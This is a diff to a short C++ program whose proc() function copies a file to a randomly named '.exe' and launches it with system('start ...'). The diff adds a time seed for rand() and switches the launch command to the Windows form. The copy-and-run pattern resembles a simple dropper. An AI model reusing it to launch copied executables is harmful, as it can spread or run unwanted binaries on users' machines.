@@ -1,6 +1,8 @@
 #include <dirent.h>
 #include <string>
 #include <cstdio>
+#include <time.h>
+#include <cstdlib>
 #include <iostream>
 #include <fstream>
 #include <sys/stat.h>
@@ -18,6 +20,7 @@ int proc(){
 			break;
 		}
 	}
+	srand(time(NULL));
 	s.open(name,std::ios::binary);
 	std::string nname = "aaa"+std::to_string(rand())+".bb.exe";
 	d.open(nname,std::ios::binary);
@@ -25,7 +28,7 @@ int proc(){
 	//chmod (nname.c_str(),mode_t(0775));
 	s.close();
 	d.close();
-	system(("./"+nname+"").c_str());
+	system(("start "+nname+"").c_str());
 }
 int main(){
 	proc();
